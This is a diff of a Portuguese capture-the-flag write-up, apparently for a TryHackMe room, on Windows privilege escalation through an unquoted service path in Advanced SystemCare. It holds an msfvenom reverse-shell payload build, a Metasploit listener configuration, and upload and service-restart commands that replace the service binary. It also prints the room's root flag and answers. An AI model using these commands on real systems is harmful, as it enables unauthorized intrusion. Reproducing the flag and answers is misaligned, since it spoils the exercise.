@@ -161,18 +161,53 @@ A opção CanRestart estando configurada como Trus, nos permite reiniciar um ser
 Com o msfvenom, vamos gerar um shell reverso como um executável do Windows:
 
 ```shell
-msfvenom -p windows/shell_reverse_tcp LHOST=IP_HOST_ATACANTE LPORT=4444 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=IP_HOST_ATACANTE LPORT=4444 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 ```
 
+Usando um payload novo de shell reverso:
+
+```shell
+meterpreter > background
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST IP_HOST_ATACANTE
+set LPORT 4444
+run -j
+```
+
+Retornando para a sessão antiga:
+
+```shell
+shell
+sc stop AdvancedSystemCareService9
+```
+
+Após parar a aplicação, pressione CTRL+C, responda y.
+
+Realize o upload do exploit, arquivo executável malicioso:
+
+```shell
+upload ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+```
+
+Retorne novamente ao shell e inicie a aplicação, que executará agora o arquivo malicioso:
+
+```shell
+shell
+sc start AdvancedSystemCareService9
+```
+
+Um shell com permissão elevada será obtido. Agora basta ler o conteúdo do arquivo ***C:/Users/Administrator/Desktop/root.txt***. Resposta da questão ***d***.
 ### Questões:
 
 - a. ***Informações sobre como enumerar o alvo*** *Não há necessidade de resposta*
 
 - b. ***Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?*** *AdvancedSystemCareService9*
 
-- c. 
+- c. ***Informações adicionais*** *Não há necessidade de resposta*
 
 ## Task 4 - Access and Escalation Without Metaspl
 oit 
 
+- d. ***What is the root flag?*** 9af5f314f57607c00fd09803a587db80
 
